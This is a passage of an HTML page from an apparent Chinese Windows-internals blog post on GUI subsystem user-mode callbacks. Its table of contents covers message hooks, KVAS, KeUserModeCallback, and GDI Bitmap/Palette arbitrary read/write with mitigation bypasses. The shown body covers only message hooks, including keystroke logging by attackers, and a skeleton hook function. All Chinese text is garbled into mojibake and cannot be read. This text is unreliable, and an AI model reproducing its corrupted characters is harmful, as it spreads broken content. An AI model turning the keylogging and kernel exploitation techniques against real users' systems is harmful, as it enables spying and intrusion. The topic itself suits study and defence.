<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/favicon.png" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"directoree.github.io","root":"/","scheme":"Mist","version":"8.0.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
  </script>

  <meta name="description" content="ğŸ˜„">
<meta property="og:type" content="article">
<meta property="og:title" content="GUI Subsystem ç”¨æˆ·å›è°ƒ">
<meta property="og:url" content="https://directoree.github.io/post/Windows-GUI-Subsystem2/index.html">
<meta property="og:site_name" content="Ë—Ë‹Ëâ™¡ËËŠË—">
<meta property="og:description" content="ğŸ˜„">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/10/12/4vUDqb9rZhN7E1c.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/13/vxgZjEQTqakSVMe.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/13/FL2PBhNEVqMg5KC.png">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiEnableKvaShadowing.jpg">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiSystemCall64Shadow.png">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiBreakpointTrapShadow.jpg">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/SwapContext.jpg">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiKernelSysretExit.jpg">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/qlS4ixbLKZfuv1o.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/rKCBDAQFqglvf9j.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/CzKN4hkqQXYuDtM.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/QjIRO51cnSL62Ai.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/xUqdV7wbM2ejEsB.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/ys8UjmzEFNYCoSv.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/xUqdV7wbM2ejEsB.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/NK7PhSsmqVbt12j.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/93luQyKFrRcxiz1.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/6McwEly7xYA9N4a.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/5hH8vwjNOB9Vc63.png">
<meta property="og:image" content="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100213.png">
<meta property="og:image" content="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100217.png">
<meta property="og:image" content="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100219.png">
<meta property="og:image" content="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100224.png">
<meta property="article:published_time" content="2022-10-12T10:11:02.000Z">
<meta property="article:modified_time" content="2023-06-17T15:15:07.762Z">
<meta property="article:author" content="Catecat">
<meta property="article:tag" content="Windowså†…æ ¸">
<meta property="article:tag" content="GUI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/10/12/4vUDqb9rZhN7E1c.png">


<link rel="canonical" href="https://directoree.github.io/post/Windows-GUI-Subsystem2/">


<script data-pjax class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>GUI Subsystem ç”¨æˆ·å›è°ƒ | Ë—Ë‹Ëâ™¡ËËŠË—</title><meta name="robots" content="noindex">
  


  <script data-pjax>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?b832a9ae9a43377003fd975ca4e525ea";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<style>.darkmode--activated{--body-bg-color:#222;--content-bg-color:#222;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#2d2f31;--highlight-foreground:#ccc;--highlight-gutter-background:#333;--highlight-gutter-foreground:#888}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#fff;background:#555}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Ë—Ë‹Ëâ™¡ËËŠË—</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">çˆ±ä½ æ‰€çˆ±ï¼Œè¡Œä½ æ‰€è¡Œï¼Œå¬ä»ä½ å¿ƒï¼Œæ— é—®è¥¿ä¸œã€‚</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/newcategories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-æ›´æ–°æ—¥å¿—">

    <a href="/changelog" rel="section"><i class="fa fa-heartbeat fa-fw"></i>æ›´æ–°æ—¥å¿—</a>

  </li>
        <li class="menu-item menu-item-ç©ºè°ƒæˆ¿">

    <a href="/tips" rel="section"><i class="fa fa-wifi fa-fw"></i>ç©ºè°ƒæˆ¿</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E9%92%A9%E5%AD%90%EF%BC%88Hook%EF%BC%89"><span class="nav-text">1 é’©å­ï¼ˆHookï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%B6%88%E6%81%AF%E9%92%A9%E5%AD%90"><span class="nav-text">1.1 æ¶ˆæ¯é’©å­</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0"><span class="nav-text">é’©å­å‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E4%BC%A0%E9%80%92%E3%80%81%E5%8D%B8%E8%BD%BD"><span class="nav-text">é’©å­çš„å®‰è£…ã€ä¼ é€’ã€å¸è½½</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E9%93%BE%E8%A1%A8"><span class="nav-text">é’©å­é“¾è¡¨</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B6%88%E6%81%AF%E9%92%A9%E5%AD%90%E7%BB%93%E6%9E%84tagHOOK"><span class="nav-text">æ¶ˆæ¯é’©å­ç»“æ„tagHOOK</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E6%89%80%E6%9C%89%E6%B6%88%E6%81%AF%E6%8C%82%E9%92%A9"><span class="nav-text">æšä¸¾æ‰€æœ‰æ¶ˆæ¯æŒ‚é’©</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E4%BA%8B%E4%BB%B6%E9%92%A9%E5%AD%90"><span class="nav-text">1.2 äº‹ä»¶é’©å­</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-GUI-Windows-10%E4%BB%A5%E5%90%8E%E7%9A%84%E5%8F%98%E5%8C%96"><span class="nav-text">2 GUI-Windows 10ä»¥åçš„å˜åŒ–</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%88%9D%E6%AD%A5%E4%BA%86%E8%A7%A3KVAS"><span class="nav-text">3 åˆæ­¥äº†è§£KVAS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFKVAS"><span class="nav-text">ä»€ä¹ˆæ˜¯KVAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90KVAS%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-text">åˆ†æKVASåˆå§‹åŒ–è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dual-CR3"><span class="nav-text">dual CR3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-User-Mode-CallBack"><span class="nav-text">4 User-Mode CallBack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%8F%82%E6%95%B0%E8%A7%A3%E9%87%8A"><span class="nav-text">4.1 å‚æ•°è§£é‡Š</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ApiNumber"><span class="nav-text">ApiNumber</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#InputBuffer"><span class="nav-text">InputBuffer</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-KeUserModeCallback-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">4.2 KeUserModeCallback å‡½æ•°åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#KSTACK-CONTROL"><span class="nav-text">KSTACK_CONTROL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#KeUserModeCallback%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">KeUserModeCallbackæºç åˆ†æ</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-KiCallUserMode%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">4.3 KiCallUserModeå‡½æ•°åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-KiServiceExit"><span class="nav-text">4.4 KiServiceExit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-KiUserCallbackDispatcher%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">4.5 KiUserCallbackDispatcherå‡½æ•°åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-6-ZwCallbackReturn"><span class="nav-text">4.6 ZwCallbackReturn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-7-NtCallbackReturn"><span class="nav-text">4.7 NtCallbackReturn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-8-%E8%B0%83%E7%94%A8%E5%85%A8%E6%99%AF%E5%9B%BE"><span class="nav-text">4.8 è°ƒç”¨å…¨æ™¯å›¾</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E5%90%8E%E7%BB%AD%E5%B7%A5%E4%BD%9C"><span class="nav-text">5 åç»­å·¥ä½œ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-GDI-%E5%AF%B9%E8%B1%A1%E5%88%86%E6%9E%90"><span class="nav-text">6 GDI å¯¹è±¡åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Bitmap%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-text">1.1 BitmapåŸºç¡€æ¦‚å¿µ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Bitmap-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%EF%BC%88-lt-1607%EF%BC%89"><span class="nav-text">1.2 Bitmap ä»»æ„åœ°å€è¯»å†™ï¼ˆ&lt;1607ï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E7%BB%95%E8%BF%87-RS1-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%EF%BC%88-lt-1703%EF%BC%89"><span class="nav-text">1.3 ç»•è¿‡ RS1 ç¼“è§£æªæ–½ï¼ˆ&lt;1703ï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E7%BB%95%E8%BF%87-RS2-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%EF%BC%88-lt-1709%EF%BC%89"><span class="nav-text">1.4 ç»•è¿‡ RS2 ç¼“è§£æªæ–½ï¼ˆ&lt;1709ï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Palette%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-text">2.1 PaletteåŸºç¡€æ¦‚å¿µ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-CreatePalette"><span class="nav-text">2.2 CreatePalette</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-GetPaletteEntries-x2F-SetPaletteEntries"><span class="nav-text">2.3 GetPaletteEntries&#x2F;SetPaletteEntries</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">2.4 åˆ©ç”¨æ€è·¯</span></a></li></ol></li></ol></div>
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Catecat"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Catecat</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">115</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/newcategories/">
          
        <span class="site-state-item-count">49</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">68</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Directoree" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;Directoree" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:zhao_yilong@aliyun.com" title="E-Mail â†’ mailto:zhao_yilong@aliyun.com" rel="noopener" target="_blank"><i class="fas fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="http://sighttp.qq.com/msgrd?v=1&uin=1003432683" title="QQ â†’ http:&#x2F;&#x2F;sighttp.qq.com&#x2F;msgrd?v&#x3D;1&amp;uin&#x3D;1003432683" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://catecat.gitee.io/" title="Cutecat â†’ https:&#x2F;&#x2F;catecat.gitee.io" rel="noopener" target="_blank"><i class="fas fa-heartbeat fa-fw"></i>Cutecat</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://catecat.top/" title="Directoree â†’ https:&#x2F;&#x2F;catecat.top" rel="noopener" target="_blank"><i class="fas fa-heart fa-fw"></i>Directoree</a>
      </span>
  </div>
  <div class="cc-license site-overview-item animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://treecatee.github.io/" title="https:&#x2F;&#x2F;treecatee.github.io" rel="noopener" target="_blank">Treecatee</a>
        </li>
    </ul>
  </div>

      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://directoree.github.io/post/Windows-GUI-Subsystem2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Catecat">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ë—Ë‹Ëâ™¡ËËŠË—">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          GUI Subsystem ç”¨æˆ·å›è°ƒ
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2022-10-12 18:11:02" itemprop="dateCreated datePublished" datetime="2022-10-12T18:11:02+08:00">2022-10-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-06-17 23:15:07" itemprop="dateModified" datetime="2023-06-17T23:15:07+08:00">2023-06-17</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/GUI/" itemprop="url" rel="index"><span itemprop="name">GUI</span></a>
        </span>
    </span>

  
    <span id="/post/Windows-GUI-Subsystem2/" class="post-meta-item leancloud_visitors" data-flag-title="GUI Subsystem ç”¨æˆ·å›è°ƒ" title="é˜…è¯»æ¬¡æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°ï¼š</span>
      <span class="leancloud-visitors-count"></span>
    </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valineï¼š</span>
    
    <a title="valine" href="/post/Windows-GUI-Subsystem2/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/post/Windows-GUI-Subsystem2/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>65k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>59 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>ğŸ˜„</p>
<span id="more"></span>

<h2 id="1-é’©å­ï¼ˆHookï¼‰"><a href="#1-é’©å­ï¼ˆHookï¼‰" class="headerlink" title="1 é’©å­ï¼ˆHookï¼‰"></a>1 é’©å­ï¼ˆHookï¼‰</h2><h3 id="1-1-æ¶ˆæ¯é’©å­"><a href="#1-1-æ¶ˆæ¯é’©å­" class="headerlink" title="1.1 æ¶ˆæ¯é’©å­"></a>1.1 æ¶ˆæ¯é’©å­</h3><p><strong>æ¶ˆæ¯é’©å­å¯ä»¥åœ¨çª—å£æ¶ˆæ¯åˆ°è¾¾ç›®æ ‡çª—å£è¿‡ç¨‹ä¹‹å‰æ‹¦æˆªå®ƒä»¬</strong>ã€‚æ¶ˆæ¯é’©å­å¯ä»¥åœ¨çª—å£æ¶ˆæ¯åˆ°è¾¾ç›®æ ‡çª—å£è¿‡ç¨‹ä¹‹å‰æ‹¦æˆªå®ƒä»¬ã€‚ ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥ç›‘è§†æ‰€æœ‰ä¸é”®ç›˜ç›¸å…³çš„æ¶ˆæ¯ï¼ŒåŒ…æ‹¬ <code>WM_KEYDOMN</code>ï¼Œä»¥ä¾¿è®°å½•å®ƒä»¬ï¼Œç„¶åå°†å®ƒä»¬ä¼ é€’ç»™é¢„æœŸçš„åº”ç”¨ç¨‹åºï¼Œæˆ–è€…é˜»æ­¢å®ƒä»¬åˆ°è¾¾æ­£ç¡®çš„ä½ç½®ã€‚ è¿™æ˜¯åœ¨åŸºäº Windows çš„ç³»ç»Ÿä¸Šè®°å½•å‡»é”®çš„æœ€å¤è€å’Œæœ€æœ‰æ•ˆçš„æ–¹æ³•ä¹‹ä¸€ã€‚</p>
<p>å½“é’©å­å‡½æ•°é’©åˆ°é¢„æœŸçš„æ¶ˆæ¯åï¼Œå¯ä»¥å†³å®šæ˜¯å¦å°†æ¶ˆæ¯ç»§ç»­å¾€åä¼ é€’ï¼ˆä¼ ç»™ä¸‹ä¸€ä¸ªé’©å­å‡½æ•°æˆ–ä¼ ç»™ç›®æ ‡çª—å£å›è°ƒå‡½æ•°ï¼‰ã€‚</p>
<p>æ¶ˆæ¯ä¼ é€’ï¼Œæ— é’©å­æƒ…å†µï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/12/4vUDqb9rZhN7E1c.png" alt="28.png"></p>
<p>æœ‰å…¨å±€é’©å­çš„æƒ…å†µï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/13/vxgZjEQTqakSVMe.png" alt="29.png"></p>
<ul>
<li><strong>å±€éƒ¨é’©å­</strong>ï¼šä»…ç›‘æ§<strong>å½“å‰è¿›ç¨‹ä¸­</strong>æŒ‡å®šçº¿ç¨‹çš„æ¶ˆæ¯ã€‚</li>
<li><strong>å…¨å±€é’©å­</strong>ï¼šç›‘æ§å½“å‰æ¡Œé¢ä¸­æ‰€æœ‰å¤„ç†æ¶ˆæ¯çš„çº¿ç¨‹ï¼ˆAffect all GUI threads in the same desktopï¼‰ã€‚<strong>å…¨å±€é’©å­å‡½æ•°å¿…é¡»æ”¾åœ¨DLLä¸­</strong>ï¼Œç„¶åå°† DLL æ³¨å…¥ç›®æ ‡è¿›ç¨‹ã€‚</li>
</ul>
<h4 id="é’©å­å‡½æ•°"><a href="#é’©å­å‡½æ•°" class="headerlink" title="é’©å­å‡½æ•°"></a>é’©å­å‡½æ•°</h4><p>é’©å­å¤„ç†å›è°ƒå‡½æ•°ï¼Œå‚æ•°ç”±ç³»ç»Ÿæä¾›ï¼Œå¯å‚é˜…<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644975(v=vs.85)">CallWndProc</a>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">HookProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ <span class="keyword">int</span> nCode, </span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ WPARAM wParam, </span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// process message</span></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> CallNextHookEx(<span class="literal">NULL</span>, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
